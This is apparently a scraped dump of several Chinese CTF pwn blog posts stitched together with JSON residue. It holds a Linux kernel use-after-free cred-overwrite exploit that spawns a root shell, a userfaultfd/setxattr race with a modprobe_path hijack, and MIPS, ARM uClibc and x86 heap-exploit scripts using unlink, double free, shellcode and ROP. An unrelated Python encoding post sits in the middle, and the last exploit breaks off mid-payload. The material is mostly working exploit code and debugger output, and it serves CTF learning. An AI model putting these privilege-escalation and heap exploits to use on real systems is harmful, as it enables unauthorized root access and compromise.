那该如何提权呢？容易想到劫持cred结构体改写uidgid，具体思路如下：1.open两次得到fd1.fd22.利用ioctl改struct保存0xc8大小的堆块(cred结构体大小为0xa8)3.close(fd1)此时0xa8大小的内存被kfree()4.fork出子进程，在进程创建时会申请存放cred结构体的内存，此时刚被kfree的堆块被申请出来。5.通过对fd2进行write操作改写cred结构体的uidgid=0完成提权。 调试：执行完第二步的结构体: 1234gef➤ x/20gx 0xffffffffc00024c9-10xffffffffc00024c8: 0x0000000000000000 0xffff880003ce16c00xffffffffc00024d8: 0x00000000000000a8 0x00000000000000000xffffffffc00024e8: 0x0000000000000000 0x0000000000000000 write前(已经劫持cred): 12345678gef➤ x/20gx 0xffff880003ce16c0-0x100xffff880003ce16b0: 0x0000000000000000 0x00000000000000000xffff880003ce16c0: 0x000003e800000002 0x000003e8000003e80xffff880003ce16d0: 0x000003e8000003e8 0x000003e8000003e80xffff880003ce16e0: 0x00000000000003e8 0x00000000000000000xffff880003ce16f0: 0x0000000000000000 0x00000000000000000xffff880003ce1700: 0x0000003fffffffff 0x00000000000000000xffff880003ce1710: 0x0000000000000000 0x0000000000000000 write后: 12345678gef➤ x/20gx 0xffff880003ce16c0-0x100xffff880003ce16b0: 0x0000000000000000 0x00000000000000000xffff880003ce16c0: 0x0000000000000000 0x00000000000000000xffff880003ce16d0: 0x0000000000000000 0x000003e8000000000xffff880003ce16e0: 0x00000000000003e8 0x00000000000000000xffff880003ce16f0: 0x0000000000000000 0x00000000000000000xffff880003ce1700: 0x0000003fffffffff 0x00000000000000000xffff880003ce1710: 0x0000000000000000 0x0000000000000000 对照内核cred结构体源码： 123456789101112131415161718192021222324252627282930313233343536373839struct cred { atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */}; exp: 12345678910111213141516171819202122232425262728293031323334353637#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main(){ int fd1 = open(&quot;/dev/babydev&quot;, 2); int fd2 = open(&quot;/dev/babydev&quot;, 2); ioctl(fd1, 0x10001, 0xa8); close(fd1); int pid = fork(); if(pid == 0) { char zeros[30] = {0}; write(fd2, zeros, 28); if(getuid() == 0) { system(&quot;/bin/sh&quot;); exit(0); } } else { wait(NULL); } close(fd2); return 0;}","link":"/2020/11/09/kernel_pwn(3)/"},{"title":"kernel_pwn userfaultfd","text":"kernel_pwn userfaultfd userfaultfd的利用姿势是在realworld ctf的议题直播里跟着BrieflyX大佬学习的，对该方法很是好奇，赛后就调了下kstack。 userfaultfd是种page fault的处理方式。正常发生页缺失会引发异常，交给内核里的异常处理程序去解决，但userfaulted是让用户态的程序去处理自己的page fault。userfaultfd具体的工作流程以及实现机制在BrieflyX的博客里讲的很清楚了，我主要记录下做kstack的过程来加深对该机制的理解。 kstack题目给出了源码，实现了push和pop操作，涉及的结构为： 12345typedef struct _Element { int owner; unsigned long value; struct _Element *fd;} Element; owner标识所属进程的PID，value即存储的数据，fd指向下一个_Element结构体（以链表的方式组织）。 主要逻辑在proc_ioctl()函数里： 123456789101112131415161718192021222324252627282930313233343536static long proc_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){ Element *tmp, *prev; int pid = task_tgid_nr(current); switch(cmd) { case CMD_PUSH: tmp = kmalloc(sizeof(Element), GFP_KERNEL); tmp-&gt;owner = pid; tmp-&gt;fd = head; head = tmp; if (copy_from_user((void*)&amp;tmp-&gt;value, (void*)arg, sizeof(unsigned long))) { head = tmp-&gt;fd; kfree(tmp); return -EINVAL; } break; case CMD_POP: for(tmp = head, prev = NULL; tmp != NULL; prev = tmp, tmp = tmp-&gt;fd) { if (tmp-&gt;owner == pid) { if (copy_to_user((void*)arg, (void*)&amp;tmp-&gt;value, sizeof(unsigned long))) return -EINVAL; if (prev) { prev-&gt;fd = tmp-&gt;fd; } else { head = tmp-&gt;fd; } kfree(tmp); break; } if (tmp-&gt;fd == NULL) return -EINVAL; } break; } return 0;} 逻辑也比较简单了，push先kmalloc一个sizeof(Element)大小的内存，之后设置owner并通过头插法连入链表，之后调用copy_from_user从用户区域读入数据到value，然后把该结点删除并kfree。 pop的话从头部查找，找到属于该进程的结点，之后将该结点value拷贝到用户区域，然后把zhe该结点删除并kfree。 看起来逻辑没什么问题，但存在的一个问题是整个过程没有加锁，并且对结点的删除操作是在copy_from_user()和copy_to_user()之后的。 那么如果带着利用userfaultfd构造race的想法再看这个逻辑的话如果在push时执行到copy_from_user()，由于用户区域arg是需要userfaultfd的，则该线程就会阻塞在这里，此时交给用户态的fault_handler_thread线程处理。该线程是用户可控的，如果再控制该线程执行pop操作，此时就会将之前push的结点里的value拷贝到用户区域。 因此就要想办法使得push时kmalloc拿到的chunk对应结点value的位置存放有kernel里的地址，这里用到的一个方法时利用shm_file_date： 123456struct shm_file_data{ int id; struct ipc_namespace *ns; struct file *file; const struct vm_operations_struct *vm_ops;} 该结构体总的大小和Element大小差不多，通过slab分配0x24大小的chunk存放。 通过调用shmget建立一个共享内存对象，并shmat将对象映射到调用进程的地址空间，之后通过shmdt删除，则shm_file_data也会被free，之后再通过push的kmalloc时就会拿到刚刚free的chunk，同时对应vaule的位置还残留着之前struct ipc_namespace *ns的内容，该指针一般指向存在了的general namespace，该地址时kernel的地址，从而配合上面的pop到达leak地址的效果。 这里也提一下如何创建并注册一个需要通过userfaultfd的对象： 创建一个userfaultfd对象： 123456789uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);if(uffd == -1){ errExit(&quot;userfaultfd&quot;);}uffdio_api.api = UFFD_API;uffdio_api.features = 0;if(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == -1){ errExit(&quot;ioctl-UFFDIO_API&quot;);} 之后mmap一块内存，mmap出来的内存只有在真正使用到时才会映射到物理内存，因此对mmap出来内存的第一个r/w操作会触发page fault。 123456page_size = sysconf(_SC_PAGE_SIZE);len = 4 * page_size;addr = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);if(addr == MAP_FAILED){ errExit(&quot;mmap&quot;);} 然后将区域注册为userfaultfd处理机制: 123456uffdio_register.range.start = (unsigned long)addr;uffdio_register.range.len = len;uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;if(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == -1){ errExit(&quot;ioctl-UFFDIO_REGISTER&quot;);} leak完地址后继续利用userfaultfd的机制，pop一个需要userfaultfd的内存，在执行到copy_to_user()时阻塞，此时在fault_handler_thread线程中再执行一次pop，由于删除操作还未执行，因此处理的是同一个结点，在handler线程里将该结点删除后唤醒阻塞在copy_to_user()的线程继续执行删除操作，就会导致一个结点被free两次造成double free。 有了地址和double free接下来就是想办法提权或拿flag了。要利用double free的话要想办法修改chunk的前8个字节为目的地址，仅仅通过push的kmalloc是无法实现的这里用到了userfaultfd + setxattr的组合拳。 123456789101112131415161718192021222324252627282930313233343536373839404142434445static longsetxattr(struct dentry *d, const char __user *name, const void __user *value, size_t size, int flags){ int error; void *kvalue = NULL; void *vvalue = NULL; /* If non-NULL, we used vmalloc() */ char kname[XATTR_NAME_MAX + 1]; if (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE)) return -EINVAL; error = strncpy_from_user(kname, name, sizeof(kname)); if (error == 0 || error == sizeof(kname)) error = -ERANGE; if (error &lt; 0) return error; if (size) { if (size &gt; XATTR_SIZE_MAX) return -E2BIG;[1] kvalue = kmalloc(size, GFP_KERNEL | __GFP_NOWARN); if (!kvalue) { vvalue = vmalloc(size); if (!vvalue) return -ENOMEM; kvalue = vvalue; }[2] if (copy_from_user(kvalue, value, size)) { error = -EFAULT; goto out; } if ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) || (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0)) posix_acl_fix_xattr_from_user(kvalue, size); } error = vfs_setxattr(d, kname, kvalue, size, flags);out: if (vvalue) vfree(vvalue); else[7] kfree(kvalue); return error;} setxattr源码里注意到[1]处kmalloc一个可控size的chunk，之后将value内容的size长度拷贝到kmalloc申请的chunk里，如果value处于两个页的交汇处，即value的内容在一个正常的页面的末尾，而在size-value_size的部分在下一个页面，而该页面会触发page fault且被注册为userfaultfd，则会导致在执行[2]copy_from_user()时，处于正常页面的value_size的内容会被正常拷贝，而之后到下一个页面时会触发userfaulted交给handler_thread处理。 这里BrieflyX拿flag的方法是将modprobe_path - 8的地址放在一个页的最后8个字节位置上，下一个页注册为userfaulted。 之后通过setxattr()修改double free的chunk头八个字节为modprobe_path - 8的地址，之后在handler_thread线程里利用两次push取出modprobe_path - 8的内存，并修改modprobe_path为/tmp/x。 x文件内容提前被设置system(&quot;echo -ne '#!/bin/sh\\n/bin/chmod 777 /flag' &gt; /tmp/x &quot;);system(&quot;chmod +x /tmp/x&quot;);，modprobe_path其实就是一个文件路径的字符串，该文件在系统试图执行一个无法执行（除elf和shell脚本#!）的程序后执行。 因此提前设置一个无法识别执行的脚本system(&quot;echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' &gt; /tmp/dummy&quot;);system(&quot;chmod +x /tmp/dummy&quot;);。 此时执行dummy文件，系统会报错，接着便会执行modprobe_path的x文件，从而修改flag权限为777，之后system(&quot;cat /flag&quot;)拿到flag。 userfaultfd就像是在copy_to/from_user()处下了断点，形成一个稳定的race窗口，具有较强的通用型，这里的重点在于handler_thread的构造，如何区分不同的情况并进行相应配合的操作。我也是看的BrieflyX大佬的exp学习的。 参考： http://brieflyx.me/2020/linux-tools/userfaultfd-internals/ https://www.bilibili.com/video/BV1qi4y1F7F1","link":"/2021/01/14/kernel_pwn(userfaultfd)/"},{"title":"mipspwn","text":"mipspwn 最近遇到的异架构的pwn题越来越多了，也是未来pwn的发展趋向，决定入坑一下，就从西湖论剑的一道mipspwn开始进入mips的世界吧:) mips构架下的pwn和x86的pwn主要区别在于寄存器，指令集的区别。网上博客挺多的，我主要说下常见到的点（会不断补充的）： 1.a0,a1,a2寄存器用来函数的传参，多的用栈传递。 2.fp类似rbp但有又不同，ret_addr在fp-4，存储上一个栈帧的位置为fp-8。sp相当于rsp。 3.mips常用shellcode的地址覆盖返回地址来拿shell。 4.qemu-user起的mipspwn题的地址是固定的(动态链接库什么的除外)，且一般保护措施都没开启。 西湖论剑managesystemmips下pwn静态分析用ghidra，ida反编译不了0.0 这题漏洞很明显： 12345678910111213141516171819puts(&quot;Enter the index of user you want edit: &quot;);scanf(&quot;%d&quot;,&amp;iStack12);if ((iStack12 &lt; 0) || (0x10 &lt; iStack12)) { puts(&quot;No!&quot;);}else { if (*(int *)(note_list + iStack12 * 8) == 0) { puts(&quot;Nothing!&quot;); } else { puts(&quot;The new user\\'s info: &quot;); sVar1 = read(0,*(void **)(note_list + iStack12 * 8),*(int *)(note_list + iStack12 * 8 + 4)+ 8); //堆溢出可覆盖next_chunk的size if (sVar1 &lt; 0) { puts(&quot;Some error happened!&quot;); /* WARNING: Subroutine does not return */ exit(0); } puts(&quot;Edit compl } 这就好办了，直接unlink。 先add4次，最后一个chunk存放shellcode，然后在chunk1里构造fake_chunk同时改next_chunk的inuse位，mips下是直接size-1即可，之后dele掉chunk2，触发unlink。效果： 123456789pwndbg&gt; telescope 0x0041183000:0000│ 0x411830 (note_list) —▸ 0x412008 ◂— 'aaaaaaaaaaaaaaaaaaaaaaa'01:0004│ 0x411834 (note_list+4) ◂— 0x24 /* '$' */02:0008│ 0x411838 (note_list+8) —▸ 0x411830 (note_list) —▸ 0x412008 ◂— 'aaaaaaaaaaaaaaaaaaaaaaa' //unlink03:000c│ 0x41183c (note_list+12) ◂— 0x34 /* '4' */04:0010│ 0x411840 (note_list+16) —▸ 0x412068 ◂— 'ccccccccccccccccccccccc'05:0014│ 0x411844 (note_list+20) ◂— 0x34 /* '4' */06:0018│ 0x411848 (note_list+24) —▸ 0x4120a0 ◂— lui $t1, 0x6962 /* 0x3c096962 */07:001c│ 0x41184c (note_list+28) ◂— 0x84 之后edit(1)来控制chunk0的指针，配合show泄露libc(用的free_got)，和stack(用的env(libc里的env)环境变量指针)。 然后偏移得到ret_addr，之后edit改chunk0_ptr位ret_addr，再edit(0)改返回地址为存放shellcode的chunk地址。 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level='debug'context.arch='mips'def cmd(c): p.sendafter(&quot;options &gt;&gt; &quot;,str(c)*2)def add(sz,content): cmd(1) p.sendlineafter(&quot;length: &quot;,str(sz)) p.sendafter(&quot;info: &quot;,content)def dele(idx): cmd(2) p.sendlineafter(&quot;: &quot;,str(idx))def edit(idx,content): cmd(3) p.sendlineafter(&quot;: &quot;,str(idx)) p.sendafter(&quot;info: &quot;,content)def show(idx): cmd(4) p.sendlineafter(&quot;: &quot;,str(idx))def main(host,port=1234): global p if host: p=remote(host,port) else: p=process(['./qemu-mipsel-static', '-L', './', '-g', '1234', './managesystem']) add(0x24,'a'*0x18) add(0x34,'b'*0x18) add(0x34,'c'*0x18) sc=asm(shellcraft.sh(),endian='little') add(0x84,sc+'a') node_list=0x00411830 payload=p32(0)+p32(0x31)+p32(node_list+8-0xc)+p32(node_list+8-0x8) payload=payload.ljust(0x30,'\\x00') payload+=p32(0x30)+p32(0x38) edit(1,payload) dele(2) edit(1,p32(0x04117B4)) show(0) p.recvuntil(&quot;info: &quot;) libc = u32(p.recv(4))-0x0056B68 info(&quot;libc&quot;+hex(libc)) edit(1,p32(libc+0x007AE90)) #env -&gt;stack show(0) p.recvuntil(&quot;info: &quot;) stack=u32(p.recv(4)) info(&quot;stack&quot;+hex(stack)) ret=stack-0x158 edit(1,p32(ret)) edit(0,p32(0x4120a0)) cmd(5) p.interactive()if __name__ == '__main__': main(0)","link":"/2020/10/16/mipspwn%E5%88%9D%E8%AF%86/"},{"title":"python en(de)code","text":"先上代码python爬虫 代码写挺长的，也是边学边写，但一直搞不清楚python的encode(编码)和decode(解码)。以下是我的探究之路。 一、当然先看官方文档地址如下 里面提到encode函数‘Return an encoded version of the string as a bytes object.’就是将字符串进行编码，返回得到bytes类型对象， 而decode函数正好相反，是将bytes解码为字符串类型。 二、实际操作一下直接以爬虫代码为例： 123response=requests.get(BASE_DOMAIN, headers=HEADERS)print(response.text) run一下之后会发现很多乱码![](C:\\Users\\admin\\Pictures\\Camera Roll\\11.PNG) 查了一下发现问题处在.text上，.text是返回网页的相应数据，并按照机器认为的最大可能去解码比如utf-8。而观察本站发现’charset=gb2312’所以出现了乱码。于是， 我用encoding规定用gb2312解码： 1234response=requests.get(BASE_DOMAIN, headers=HEADERS)# print(response.text)response.encoding=&quot;gb2312&quot;print(response.text) 果然解决了乱码问题，但这和encode,decode没啥关系。。。 接下来就有关系了。 我换了一种方式： 123response=requests.get(BASE_DOMAIN, headers=HEADERS)print(response.content) 发现爬到的是bytes类型，意识到.content返回的数据是不进行解码的，又由于是由bytes到字符串的解码，所以使用decode() 12response=requests.get(BASE_DOMAIN, headers=HEADERS)print(response.content.decode('gb2312')) 一运行，woc！报错了![](C:\\Users\\admin\\Pictures\\Camera Roll\\12.PNG) 说是gb2312不能解码，这不矛盾吗… 于是赶紧上网查了一下发现gbk的解码范围包含了gb2312，于是尝试改为gbk，问题解决，成功解码~ 这只是用了decode()，那再作死一下把解码的再编码回来，走你： 123response=requests.get(BASE_DOMAIN, headers=HEADERS)r=response.content.decode('gbk')print(r.encode('gbk')) 成功编码~![](C:\\Users\\admin\\Pictures\\Camera Roll\\13.PNG) 经过了这次的探索尝试，搞明白了Python编码和解码，最近在学习汇编，相信之后从硬件的角度会对编码解码这方面有更深的理解!","link":"/2019/04/06/python-en-de-code/"},{"title":"arm构架uclibc下的堆溢出初识","text":"arm构架uclibc下的堆溢出初识第五空间2020遇到的一道arm构架的题目。 12angela@angela-dev:/mnt/hgfs/share/pwn/5space/pwnme/lib$ file a.outa.out: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped 可以看到是32位ARM动态链接的可执行文件，运行方式如下： 1qemu-arm -L ./lib ./a.out // ./lib为动态链接库的路径 首先介绍uclibc，是 glibc 的一个精简版，主要用于嵌入式设备，比如路由器就基本使用的是 uClibc， 简单自然效率高。所以他和一般的x86的堆分配机制会有些不一样。 123456789101112131415161718192021struct heap_free_area{ size_t size; //空闲区的大小 //用于构造循环链表 struct heap_free_area *next, *prev;};size 表示该空闲区域的大小，这个空闲区域的实际地址并没有用指针详细地指明，因为它就位于当前 heap_free_area 节点的前面，如下图所示：+-------------------------------+--------------------+| | heap_free_area |+-------------------------------+--------------------+\\___________ 空闲空间 ___________/\\___ 空闲空间信息 ___/实际可用的空闲空间大小为 size – sizeof(struct heap_free_area)指针 next, prev 分别指向下一个和上一个空间区域，所有的空闲区域就是通过许许多多这样的节点链起来的，很显然，这样组成的是一个双向链表。 所以 free 块在内存中的存储方式和 glibc 中的存储方式是不一样的。它的元数据在块的末尾，而 glibc中元数据在 块的开头。 所以如果我们有一个堆溢出，我们就需要覆盖到下面空闲空间的 heap_free_area 中的 指针，才能实现 uClibc中的 unlink 攻击 详细介绍uclibc的博客：https://www.cnblogs.com/hac425/p/9416738.html 而本题中由于edit函数存在堆溢出漏洞，于是我们可以首先构造overlop泄露libc之后利用堆溢出覆盖 heap_free_area 中的 指针为heaplist造成unlink最后利用edit函数覆盖free的got为system 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level='debug'DEBUG=1if DEBUG: p=process([&quot;qemu-arm&quot;,&quot;-L&quot;,&quot;./lib&quot;,&quot;./a.out&quot;])#qemu-arm -L ./lib ./a.outelse: passdef show(): p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,&quot;1&quot;)def add(l,note): p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,&quot;2&quot;) p.sendlineafter(&quot;:&quot;,str(l)) p.sendafter(&quot;:&quot;,note)def change(index,l,note): p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,&quot;3&quot;) p.sendlineafter(&quot;:&quot;,str(index)) p.sendlineafter(&quot;:&quot;,str(l)) p.sendafter(&quot;:&quot;,note)def remove(index): p.sendlineafter(&quot;&gt;&gt;&gt; &quot;,&quot;4&quot;) p.sendlineafter(&quot;:&quot;,str(index))add(0x18,&quot;aaaaaaaa&quot;) #0add(0x4f8,&quot;aaaaaaaa&quot;) #1add(0x18,&quot;aaaaaaaa&quot;) #2add(0x18,&quot;aaaaaaaa&quot;) #3change(0,0x40,&quot;a&quot;*0x1c+p64(0x500+0x20+1)) #利用堆溢出构造overlop即使2号堆块uafremove(1)add(0x4f8,&quot;aaaaaaaa&quot;) #2号堆块中存在指向main_arean+88的地址show()p.recvuntil(&quot;2 : &quot;)libc=u32(p.recv(4))+0xff720000-0xff7ba8ecsuccess('libc: '+hex(libc))add(0x18,'aaaaaaaa') #4 4号和2号指向同一堆块add(0x21,&quot;aaaaaaa&quot;) #5remove(0)remove(4)change(2,8,p32(0x21048^0x22)) #使等下申请回来的4号堆块指向heaplistadd(0x18,&quot;aaaaa&quot;) #0add(0x18,'aaaaa') #4change(4,0xf8,&quot;/bin/sh\\x00&quot;+p32(0)*4+p32(0x28)+p32(0x21038)) #使0号堆ptr为free_got(0x21038)change(0,0x8,p32(libc+0x51800)) #覆盖got#show()remove(4)gdb.attach(p)p.interactive()","link":"/2020/07/01/uclibc%E4%B8%8B%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/"},{"title":"羊城杯_Quals_repwn","text":"羊城杯 re_pwn 记一次坑爹的house of force 首先程序的逻辑很清楚：add()限制size大小为0~0x68，dele()存在double free，show函数先允许向stack上输入，之后进行加密输出。 程式唯一的输出就是加密后的输出，因此此处是leak地址的地方，如果我们不输入的话加密的内容就是存在stack上的内容，通过解密可以拿到地址。 1234567891011pwndbg&gt; stack 4000:0000│ rsp 0x7fffffffdb70 ◂— 0x001:0008│ 0x7fffffffdb78 —▸ 0x7fffffffddb8 —▸ 0x7fffffffe1a2 ◂— 'XDG_SEAT=seat0'02:0010│ 0x7fffffffdb80 —▸ 0x7fffffffdda8 —▸ 0x7fffffffe176 ◂— '/mnt/hgfs/share/ctf_in_2020/pwn/ycbctf/pwn2'03:0018│ 0x7fffffffdb88 ◂— 0x1f7ffe70004:0020│ 0x7fffffffdb90 ◂— 0x1f3c5d13940005:0028│ 0x7fffffffdb98 ◂— 0x100000000206:0030│ rdx 0x7fffffffdba0 ◂— 0x1200000033 /* '3' */07:0038│ 0x7fffffffdba8 ◂— 0x2400000078 /* 'x' */08:0040│ rdi 0x7fffffffdbb0 —▸ 0x7ffff7ffea88 —▸ 0x7ffff7ffe9b8 —▸ libc地址 0x7ffff7ffe728 —▸ 0x7ffff7ffe700 ◂— ...09:0048│ 0x7fffffffdbb8 —▸ 0x7fffffffdbf0 —▸ 0x7ffff7ffa280 ◂— add byte ptr ss:[rax], al /* '6' */ stack地址 可见通过解密可以得到stack地址和libc地址。 加密算法为： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112__int64 __fastcall sub_E95(_BYTE *a1, int a2, __int64 a3){ __int64 v3; // rdx __int64 result; // rax __int64 v5; // [rsp+0h] [rbp-38h] unsigned __int8 v6; // [rsp+26h] [rbp-12h] unsigned int sum; // [rsp+28h] [rbp-10h] unsigned int i; // [rsp+2Ch] [rbp-Ch] int num; // [rsp+30h] [rbp-8h] int v10; // [rsp+34h] [rbp-4h] v5 = a3; // a1=buf // a2=16 // a3='/* 3 */' if ( a2 &gt; 1 ) { num = 35 / a2 + 7; // 9次 sum = 0; v6 = a1[a2 - 1]; // buf[15] do { sum += 0x76129BDA; v10 = (sum &gt;&gt; 2) &amp; 3; for ( i = 0; a2 - 1 &gt; i; ++i ) // 15轮 { a1[i] += (((v6 &gt;&gt; 7) ^ (8 * a1[i + 1])) + ((a1[i + 1] &gt;&gt; 2) ^ (32 * v6)) - 33) ^ ((a1[i + 1] ^ sum ^ 0x57) + (v6 ^ *(unsigned int *)(4LL * (v10 ^ i &amp; 3) + v5)) + 63); v6 = a1[i]; } a1[a2 - 1] += (((v6 &gt;&gt; 7) ^ (8 * *a1)) + ((*a1 &gt;&gt; 2) ^ (32 * v6)) - 33) ^ ((*a1 ^ sum ^ 0x57) + (v6 ^ *(unsigned int *)(4LL * (v10 ^ i &amp; 3) + v5)) + 63); v3 = a2 - 1LL; result = (unsigned __int8)a1[v3]; v6 = a1[v3]; --num; } while ( num ); } return result;}比较明显的地方在于0x76129BDA，这个数值一般存在于tea加密算法中，比较一下：```c#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))void btea(uint32_t *v, int n, uint32_t const key[4]){ uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52/n; sum = rounds*DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); }}int main(){ uint32_t v[2]= {1,2}; uint32_t const k[4]= {2,2,3,4}; int n= 2; //n的绝对值表示v的长度，取正表示加密，取负表示解密 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 printf(&quot;加密前原始数据：%u %u\\n&quot;,v[0],v[1]); btea(v, n, k); printf(&quot;加密后的数据：%u %u\\n&quot;,v[0],v[1]); btea(v, -n, k); printf(&quot;解密后的数据：%u %u\\n&quot;,v[0],v[1]); return 0;} 发现程序在调用加密函数前也有4个key，而且只是MX和DELTA不同，可认定是btea算法改的，因此写出解密脚本为： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt;#define DELTA 0x76129BDA#define MX ( ( ((z&gt;&gt;7)^(y&lt;&lt;3)) + ((y&gt;&gt;2)^(z&lt;&lt;5))-0x21 ) ^ ((sum^y^0x57) + (key[(p&amp;3)^e] ^ z)+0x3f) )// #define MX (((((z&gt;&gt;7)^(y&lt;&lt;3)) + ((y&gt;&gt;2)^(z&lt;&lt;5)))-0x21) ^ (((sum^y^0x57) + (key[e^p&amp;3] ^ z))+0x3f))void btea(uint8_t *v, int n, uint32_t const key[4]){ uint8_t y,z; uint32_t sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 7 + 35/n; sum = 0; z = v[n-1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p=0; p&lt;n-1; p++) { y = v[p+1]; z = v[p] += MX; } y = v[0]; z = v[n-1] += MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 7 + 35/n; sum = rounds*DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) { z = v[p-1]; y = v[p] -= MX; } z = v[n-1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); }}int main(){ uint8_t v[32]= {0}; uint32_t const k[4]= {0x33,0x12,0x78,0x24}; int n= 16; read(0,v,0x10); btea((uint8_t*)v, -n, k); write(1,v,0x10); return 0;} 编译为ELF再process进来即可解密。 之后的利用思路就很明显的hof了，先double free把堆申请到栈上，然后rop读flag。 要注意的是：heap大小最大0xx68不够用来完成rop，因此要先构造一次read以读入rop。 第一次覆盖返回地址是在read写content的时候，由于call read时将返回地址push rsp，之后并没有扩展栈帧的操作，因此之后将对应存放ret_addr的地方覆盖成执行gadget的地址即可。 最后exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwn import *context.log_level='debug'DEBUG=1if DEBUG: p=process(&quot;./pwn2&quot;) libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)else: p=remote('183.129.189.60',10029) libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)def cmd(command): p.recvuntil(&quot;choice:&quot;) p.sendline(str(command))def add(sz,content): cmd(1) p.recvuntil(&quot;?&quot;) p.sendline(str(sz)) sleep(0.1) p.send(content)def dele(idx): cmd(3) p.recvuntil(&quot;?&quot;) p.sendline(str(idx))def show(content): cmd(2) p.send(content)def pwn(): # gdb.attach(p) show('\\n') enc = p.recvuntil(&quot;wellcome&quot;,drop=True) p1 = process(&quot;./dec&quot;) p1.send(enc) dec = p1.recv(0x10) libc.address = u64(dec[:8]) - 0x5f1a88 stack = u64(dec[8:]) add(0x68,&quot;AAAAAAAA\\n&quot;) add(0x68,&quot;AAAAAAAA\\n&quot;) dele(0) dele(1) dele(0) success(&quot;libc: &quot; + hex(libc.address)) success(&quot;stack: &quot; + hex(stack)) add(0x68,p64(stack-0xf3)+'\\n') add(0x68,&quot;AAAAA\\n&quot;) p_rdi = 0x000000000019dc65 + libc.address p_rsi = 0x000000000013cd4f + libc.address p_rdx = 0x0000000000115166 + libc.address p_rax = 0x000000000003a738 + libc.address syscall_ret = 0x00000000000bc3f5 + libc.address rop_chain = [ p_rdx,0x200,p_rax,0, syscall_ret ] payload=p64(p_rdx)+p64(0x200)+p64(p_rax)+p64(0)+p64(syscall_ret) # payload = flat(rop_chain) # debug(0x000000000000E62) # pause() # gdb.attach(p) add(0x68,&quot;AAAAA\\n&quot;) add(0x68,&quot;A&quot;*0x2b+payload+'\\n') payload=p64(p_rdi)+p64(stack-0xb4+0x1c)+p64(p_rsi)+p64(0)+p64(p_rdx)+p64(0)+p64(p_rax)+p64(2)+p64(syscall_ret) 